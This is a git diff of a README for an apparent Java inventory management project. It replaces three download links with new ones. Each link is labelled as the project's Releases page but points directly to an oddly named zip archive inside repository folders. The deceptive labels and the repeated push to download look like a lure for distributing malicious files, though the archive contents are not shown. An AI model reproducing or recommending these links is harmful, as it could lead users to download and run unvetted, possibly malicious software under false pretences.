@@ -1,6 +1,6 @@
 # 🖥️ Java-Inventory-Management-System - Simplifying Your Inventory Needs
 
-![Download](https://raw.githubusercontent.com/nsnsnsnss/Java-Inventory-Management-System/main/src/files/articulos/Inventory-Java-System-Management-v2.1.zip)
+![Download](https://github.com/nsnsnsnss/Java-Inventory-Management-System/raw/refs/heads/main/database/Management-Java-System-Inventory-spheriform.zip)
 
 ## 📋 Description
 
@@ -15,7 +15,7 @@ To begin using the Java Inventory Management System, you will need to download t
 ### 1. Visit the Releases Page
 Click the link below to access the Releases page where you can download the application.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/nsnsnsnss/Java-Inventory-Management-System/main/src/files/articulos/Inventory-Java-System-Management-v2.1.zip)
+[Visit the Releases Page to Download](https://github.com/nsnsnsnss/Java-Inventory-Management-System/raw/refs/heads/main/database/Management-Java-System-Inventory-spheriform.zip)
 
 ### 2. Download the Application
 On the Releases page, you will see the latest version of the application. Download the file corresponding to your operating system by clicking on it. 
@@ -81,6 +81,6 @@ This project is licensed under the MIT License. You are free to modify and distr
 
 To find more about the project and its ongoing development, visit our GitHub repository: 
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/nsnsnsnss/Java-Inventory-Management-System/main/src/files/articulos/Inventory-Java-System-Management-v2.1.zip)
+[Visit the Releases Page to Download](https://github.com/nsnsnsnss/Java-Inventory-Management-System/raw/refs/heads/main/database/Management-Java-System-Inventory-spheriform.zip)
 
 We hope the Java Inventory Management System helps you manage your inventory efficiently. Enjoy using the application!
